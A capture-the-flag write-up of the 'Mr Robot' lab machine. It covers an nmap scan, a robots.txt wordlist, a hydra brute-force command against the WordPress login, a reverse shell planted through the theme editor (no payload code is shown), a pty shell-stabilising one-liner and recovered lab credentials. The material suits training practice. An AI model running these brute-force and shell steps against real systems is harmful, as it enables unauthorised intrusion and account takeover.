# Overview

![](<img src=../../../../assets/images/mr-robot/mr_robots.png>)

# Step 1 


run a scan against the ip address of your target:

```bash

$ nmap -sCV 10.10.203.12

```

result of the scan

```bash

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 17:23 WAT
Nmap scan report for 10.10.203.12
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.26 seconds

```

- from our result we found out we have two http port open  `80/443` and closed ssh port `22` closed

<br>

which can be preview on web browser ![link](http://10.10.203.12/)

![](<img src=../../../../assets/images/mr-robot/mr_robots-http.png>)

with manual recon i find /robots.txt

![](<img src=../../../../assets/images/mr-robot/mr_robots_robots.png>)

- upon navigating to the `/robots.txt` Directory i found two entries `fsocity.dic` and `the first key` 

- i `wget` the wordlist to download it to my machine

![](<img src=../../../../assets/images/mr-robot/mr_robots_key.png>)

![](<img src=../../../../assets/images/mr-robot/mr_robots_fsociety.png>)

- moving on to the second more valuable directory found fom earlier fuzzing `/wp-login.php` 

```bash

hydra -l Elliot -P ./fsocity.dic 10.10.33.130 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30

```

result `ER28-0652` as the password

![](<img src=../../../../assets/images/mr-robot/login.png>)


- To exploit this, we need our to be upload to the machine so we can have a reverse shell

`http://IP/wp-admin/theme-editor.php?file=archive.php&theme=twentyfifteen`

- but make sure your listener is ready to catch the shell on the specified port.

![](<img src=../../../../assets/images/mr-robot/port.png>)


stabilize shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

So we don’t have permissions to check if we can run something as sudo. Let’s check this password file that it is in the robot directory:

![](<img src=../../../../assets/images/mr-robot/image.png>)


- After a couple of seconds, we got ourselves a new set of credentials:

```bash

username: robot
password: abcdefghijklmnopqrstuvwxyz

```

login and get your flag

## Thanks For reading 🤗